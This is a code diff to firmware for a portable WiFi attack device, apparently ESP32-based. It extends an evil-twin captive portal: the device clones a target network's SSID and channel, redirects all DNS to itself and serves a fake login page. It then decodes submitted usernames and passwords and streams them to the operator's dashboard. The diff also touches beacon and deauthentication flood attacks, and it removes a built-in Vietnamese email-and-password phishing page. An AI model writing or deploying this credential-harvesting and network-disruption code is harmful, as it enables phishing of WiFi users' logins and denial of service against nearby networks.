@@ -20,6 +20,11 @@
 #include "core/wifi_scan_result.h"
 #include "core/wifi_sniff.h"
 
+#ifdef ENABLE_DISRUPTIVE
+#include "core/evil_twin.h"
+#include "core/storage.h"
+#endif
+
 namespace wifiModule {
 
 namespace {
@@ -92,9 +97,9 @@ void releaseUsbRadioIfIdle() {
 // --- disruptive WiFi payloads (PLAN §2.4) ---------------------------------
 // beacon/deauth transmit raw 802.11 frames through the device's own AP
 // interface (WIFI_IF_AP); the evil portal serves its captive page from the same
-// AP. These payloads never tear the AP down themselves, but only AP clients may
-// be shadowed (evil portal); the USB dashboard and the Serial console stay the
-// control channels. They require the AP to be explicitly requested with `ap on`.
+// AP. Only AP clients may be shadowed; USB and Serial remain control channels.
+// Beacon/deauth require `ap on`. The portal owns a temporary AP via wifiAp and
+// restores the prior radio when it stops.
 enum class WifiAttack : uint8_t { None, Beacon, DeauthTarget, DeauthFlood, EvilPortal };
 WifiAttack attack = WifiAttack::None;
 bool attackActive = false;
@@ -132,15 +137,24 @@ size_t floodCount = 0;
 // wifi_evil_portal
 DNSServer portalDns;
 bool portalDnsActive = false;
-const char *const kPortalPage =
-    "<!doctype html><html lang=\"vi\"><head><meta charset=\"utf-8\">"
-    "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
-    "<title>Wi-Fi</title></head><body><h1>Đăng nhập Wi-Fi</h1>"
-    "<p>Vui lòng đăng nhập để tiếp tục.</p>"
-    "<form method=\"post\" action=\"/\">"
-    "<label>Email <input name=\"email\" type=\"text\" autocomplete=\"off\"></label><br>"
-    "<label>Mật khẩu <input name=\"password\" type=\"password\"></label><br>"
-    "<button type=\"submit\">Kết nối</button></form></body></html>";
+// Evil-twin clone state: empty while the portal runs under the device's own AP
+// name, set when the operator asked to clone a target SSID.
+char portalCloneSsid[evilTwin::kMaxSsidBytes + 1] = {};
+uint8_t portalCloneChannel = 0;
+bool portalCloned = false;
+// Whether the served page came from LittleFS (reported to the operator).
+bool portalPageFromFile = false;
+// The login page served to AP clients. /example.html in LittleFS is the page
+// the operator can edit (packaged by `pio run -t buildfs`); the built-in default
+// is only a fallback so the portal still works without it.
+std::string resolvePortalPage() {
+    std::string page;
+    portalPageFromFile =
+        storage::readTextFile(evilTwin::kPagePath, page, evilTwin::kMaxPageBytes) && evilTwin::pageUsable(page);
+    if (portalPageFromFile) return page;
+    Serial.printf("evil portal: %s missing or unusable — using built-in page\n", evilTwin::kPagePath);
+    return evilTwin::defaultPage();
+}
 #endif
 
 // The promiscuous RX callback runs on the WiFi task. Disabling promiscuous RX
@@ -559,9 +573,34 @@ void stepPortal(uint32_t now) {
         doc["kind"] = "evil_portal";
         doc["capture"] = sequence;
         doc["captures"] = attackCount;
-        doc["body"] = body;
+        // The form fields behind the attempt, decoded from the same body and
+        // kept alongside it, so the dashboard log shows what was typed
+        // instead of raw form data. A body with no recognisable field reports
+        // nulls rather than implying a credential was seen.
+        evilTwin::Credentials creds;
+        const bool found = evilTwin::parseFormCredentials(body, creds);
+        doc["user"] = found && creds.hasUser ? creds.user : nullptr;
+        doc["pass"] = found && creds.hasPass ? creds.pass : nullptr;
+
+        // publishOutput() silently drops an oversized frame, which would lose
+        // the capture entirely. The raw body is the part that can grow (it is
+        // whatever a client posted, and JSON escaping can triple it), so it is
+        // shortened until the frame fits; the bounded credential fields are
+        // never the thing dropped.
+        constexpr size_t kRawBodyBytes = 160;
+        std::string raw = body.size() > kRawBodyBytes ? body.substr(0, kRawBodyBytes) : body;
+        doc["body"] = raw;
+        doc["bodyTruncated"] = body.size() > kRawBodyBytes;
         std::string payload;
-        serializeJson(doc, payload);
+        while (true) {
+            serializeJson(doc, payload);
+            if (payload.size() <= kMaxActionOutputBytes) break;
+            // Halve the raw body and retry; worst case it ends up empty and the
+            // capture still streams with just its credentials.
+            if (raw.empty()) break;
+            raw.resize(raw.size() / 2);
+            doc["body"] = raw;
+        }
         runtime.publishOutput(attackTicket, std::move(payload), now);
         body.clear();
     }
@@ -583,6 +622,9 @@ void stopAttack() {
         portalDnsActive = false;
     }
     webDashboard::disableEvilPortal();
+    // Restore the pre-portal AP/radio without changing the operator's AP intent.
+    wifiAp::endPortal();
+    portalCloned = false;
     if (floodScanInFlight) esp_wifi_scan_stop();
     WiFi.scanDelete();
     floodScanInFlight = false;
@@ -599,7 +641,7 @@ void stopAttack() {
 }
 
 CommandError startAttack(ActionId action, const ActionParams &params, const ActionDescriptor &descriptor) {
-    if (!apInterfaceUp()) {
+    if (action != ActionId::WifiEvilPortal && !apInterfaceUp()) {
         runtime.setHealth(false, "ap not active", millis());
         return CommandError::HardwareError;
     }
@@ -649,13 +691,55 @@ CommandError startAttack(ActionId action, const ActionParams &params, const Acti
         if (params.present(4)) intervalMs = clampInterval(params.integer(4));
     } else if (action == ActionId::WifiEvilPortal) {
         kind = WifiAttack::EvilPortal;
+        portalCloned = false;
+        portalCloneSsid[0] = '\0';
+        portalCloneChannel = 0;
+        if (params.present(0)) {
+            const std::string_view ssid(params.string(0), params.stringLength(0));
+            if (!evilTwin::cloneSsidUsable(ssid)) return CommandError::InvalidParams;
+            std::memcpy(portalCloneSsid, ssid.data(), ssid.size());
+            portalCloneSsid[ssid.size()] = '\0';
+            portalCloned = true;
+        }
+        if (params.present(1)) {
+            const int64_t channel = params.integer(1);
+            if (!evilTwin::channelUsable(channel)) return CommandError::InvalidParams;
+            portalCloneChannel = static_cast<uint8_t>(channel);
+        }
     } else {
         return CommandError::UnsupportedAction;
     }
 
+    // The portal owns its AP/channel snapshot; raw-TX payloads retain the
+    // existing channel restoration below.
+    savedChannel = 0;
+    if (kind == WifiAttack::EvilPortal) {
+        if (!wifiAp::beginPortal(portalCloneSsid, portalCloneChannel)) {
+            runtime.setHealth(false, "portal AP failed", millis());
+            return CommandError::HardwareError;
+        }
+        if (!portalDns.start(53, "*", WiFi.softAPIP())) {
+            wifiAp::endPortal();
+            runtime.setHealth(false, "portal DNS failed", millis());
+            return CommandError::HardwareError;
+        }
+        portalDnsActive = true;
+    }
+    wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
+    esp_wifi_get_channel(&attackChannel, &second);
+    if (kind != WifiAttack::EvilPortal) savedChannel = attackChannel;
+
     uint32_t ticket = 0;
     const CommandError error = runtime.beginAction(millis(), 0, ticket, descriptor); // Continuous, no deadline
-    if (error != CommandError::None) return error;
+    if (error != CommandError::None) {
+        if (kind == WifiAttack::EvilPortal) {
+            portalDns.stop();
+            portalDnsActive = false;
+            wifiAp::endPortal();
+        }
+        savedChannel = 0;
+        return error;
+    }
 
     attackTicket = ticket;
     attack = kind;
@@ -666,9 +750,7 @@ CommandError startAttack(ActionId action, const ActionParams &params, const Acti
     lastAttackMs = attackStartMs - attackIntervalMs; // first transmit may run immediately
     lastAttackPublishMs = 0;
 
-    wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
-    esp_wifi_get_channel(&attackChannel, &second);
-    savedChannel = attackChannel;
+    // The pre-attack channel was captured above, before the clone moved it.
 
     switch (kind) {
     case WifiAttack::Beacon: beaconIndex = 0; break;
@@ -679,11 +761,23 @@ CommandError startAttack(ActionId action, const ActionParams &params, const Acti
         floodCount = 0;
         floodIndex = 0;
         break;
-    case WifiAttack::EvilPortal:
-        portalDns.start(53, "*", WiFi.softAPIP());
-        portalDnsActive = true;
-        webDashboard::enableEvilPortal(kPortalPage);
+    case WifiAttack::EvilPortal: {
+        webDashboard::enableEvilPortal(resolvePortalPage());
+        // Tell the operator what the portal is actually running: the clone it
+        // took (if any) and whether the served page came from LittleFS.
+        JsonDocument doc;
+        doc["kind"] = "evil_portal";
+        doc["capture"] = 0;
+        doc["captures"] = 0;
+        doc["cloned"] = portalCloned;
+        doc["ssid"] = portalCloned ? portalCloneSsid : "";
+        if (portalCloned) doc["channel"] = portalCloneChannel;
+        doc["page"] = portalPageFromFile ? evilTwin::kPagePath : "builtin";
+        std::string payload;
+        serializeJson(doc, payload);
+        runtime.publishOutput(attackTicket, std::move(payload), attackStartMs);
         break;
+    }
     case WifiAttack::None: break;
     }
     return CommandError::None;
